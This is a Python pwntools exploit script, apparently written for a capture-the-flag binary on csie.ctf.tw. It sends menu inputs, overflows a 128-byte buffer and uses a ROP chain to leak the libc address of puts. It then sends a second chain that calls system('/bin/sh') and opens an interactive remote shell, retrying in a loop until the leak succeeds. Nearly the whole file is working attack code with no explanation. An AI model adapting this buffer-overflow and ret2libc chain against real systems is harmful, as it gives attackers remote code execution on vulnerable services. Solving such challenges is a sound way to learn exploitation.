from pwn import *
import time

host = "csie.ctf.tw"
port = 10143
#host = "oasis2.csie.ntu.edu.tw"
#port = 5491

while True:
    r=remote(host,port)
    context.arch = "amd64"

    try:
        r.recvuntil(":")
    except:
        r.close()
        time.sleep(5)
        continue
    r.sendline("1")
    r.recvuntil(":")
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.recvuntil(":")
    r.recvuntil(":")
    r.sendline("0")
    r.recvuntil(":")



    payload = "a"*128

    buf = 0x00602d00
    pop_rdi_ret = 0x0400f53
    puts_got = 0x602028
    puts_plt = 0x004006F0
    pop_rsi_r15_ret = 0x0000400f51
    read_plt = 0x0400720
    pop_rbp_ret = 0x0400810
    leave_ret = 0x400b0c
    rop = flat([0xdeadbeef,pop_rdi_ret,puts_got,puts_plt,pop_rdi_ret,0,pop_rsi_r15_ret,buf,0xdeadbeefdeadbeef,read_plt,pop_rbp_ret,buf,leave_ret,buf+8*10])
    #rop += "a"*(128-88)
    r.sendline(payload)
    r.recvuntil(":")
    #print(len(rop))
    r.sendline(rop)
    #r.recvuntil("\n")
    try:
        res=r.recvuntil("\n")
    except:
        print("error")
        #time.sleep(2)
        r.close()
        continue
    print(len(res))
    if len(res)!=7:
        #time.sleep(2)
        r.close()
        continue
    data=u64(res[:-1]+"\x00\x00")
    #print(hex(data))

    puts_off = 0x06f690
    libc = data-puts_off
    print("libc:"+hex(libc))
    #r.interactive()
    system_off = 0x0045390
    system = libc+system_off
    #rop2=flat([0xdeadbeef,pop_rdi_ret,puts_got,puts_plt])
    #print(len(flat([0xdeadbeef,pop_rdi_ret,buf+32,system])))
    rop2=flat([0xdeadbeef,pop_rdi_ret,buf+32,system,"/bin/sh\x00"])
    #print(rop2)
    time.sleep(0.1)
    r.sendline(rop2)

    r.interactive()
    r.close()
    break
#put_off=0x5f140
#libc=data-put_off
#print "libc:",hex(libc)

#r.interactive()